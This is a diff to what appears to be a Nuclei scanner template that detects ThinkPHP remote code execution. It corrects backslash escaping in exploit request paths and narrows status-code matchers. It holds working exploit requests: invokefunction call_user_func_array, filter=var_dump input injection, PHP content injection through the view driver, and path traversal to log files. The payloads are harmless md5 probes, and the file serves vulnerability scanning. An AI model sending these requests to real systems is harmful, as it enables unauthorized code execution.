@@ -57,7 +57,6 @@ requests:
         GET /index.php?s={{myhref}}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333 HTTP/1.1
         Host: {{Hostname}}
 
-
     req-condition: true
     stop-at-first-match: true
 
@@ -70,7 +69,7 @@ requests:
         condition: or
       - type: dsl
         dsl:
-          - 'status_code != 404'
+          - 'status_code != 404 && status_code != 301 && status_code != 302'
     iterate-all: true
     extractors:
       - type: regex
@@ -92,7 +91,7 @@ requests:
         Connection: close
         
       - |+
-        GET /index.php?s=index/\\think\Request/input&filter=var_dump&data=f7e0b956540676a129760a3eae309294 HTTP/1.1
+        GET /index.php?s=index/\think\Request/input&filter=var_dump&data=f7e0b956540676a129760a3eae309294 HTTP/1.1
         Host: {{Hostname}}
         Accept:*/*
         Pragma:no-cache
@@ -139,14 +138,14 @@ requests:
         Connection: close
 
       - |+
-        GET /index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}] HTTP/1.1
+        GET /index.php?s=my-show-id-\x5C..\x5CTpl\x5C8edy\x5CHome\x5Cmy_1{~var_dump(md5(2333))}] HTTP/1.1
         Host: {{Hostname}}
         Accept:*/*
         Pragma:no-cache
         Accept-Encoding:gzip, deflate
         Connection: close
       - |+
-        GET /index.php?s=index/\\think\\view\driver\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E HTTP/1.1
+        GET /index.php?s=index/\think\view\driver\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E HTTP/1.1
         Host: {{Hostname}}
         Accept:*/*
         Pragma:no-cache
@@ -171,7 +170,7 @@ requests:
         s=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=var_dump
       # datetime.datetime.now().strftime("%Y_%m_%d")[2:]
       - |+
-        GET /index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{{substr(date("%Y-%M-%D"),2)}}.log HTTP/1.1
+        GET /index.php?s=my-show-id-\x5C..\x5CRuntime\x5CLogs\x5C{{substr(date("%Y-%M-%D"),2)}}.log HTTP/1.1
         Host: {{Hostname}}
         Accept:*/*
         Pragma:no-cache
@@ -187,7 +186,7 @@ requests:
       #     - 200
       - type: dsl
         dsl:
-          - 'status_code != 404'
+          - 'status_code != 404 && status_code != 301 && status_code != 302'
       - type: word
         part: body
         words:
@@ -228,7 +227,7 @@ requests:
     matchers:
       - type: dsl
         dsl:
-          - 'status_code != 404'
+          - 'status_code != 404 && status_code != 301 && status_code != 302'
       - type: regex
         part: body
         regex:
